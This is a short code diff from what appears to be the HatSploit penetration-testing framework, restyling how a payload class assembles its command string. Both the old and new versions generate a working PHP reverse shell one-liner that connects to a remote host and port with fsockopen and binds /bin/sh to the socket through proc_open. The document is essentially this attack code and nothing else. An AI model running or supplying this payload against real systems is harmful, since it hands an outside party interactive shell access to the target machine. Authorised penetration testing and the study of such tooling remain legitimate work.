@@ -27,11 +27,9 @@ class HatSploitPayload(Payload):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
 
-        payload = (
-                f"php -r '$sock=fsockopen(\""
-                + remote_host
-                + "\","
-                + remote_port
-                + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
+        return (
+            f"""php -r '$sock=fsockopen(\"{remote_host}"""
+            + "\","
+            + remote_port
+            + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
         )
-        return payload
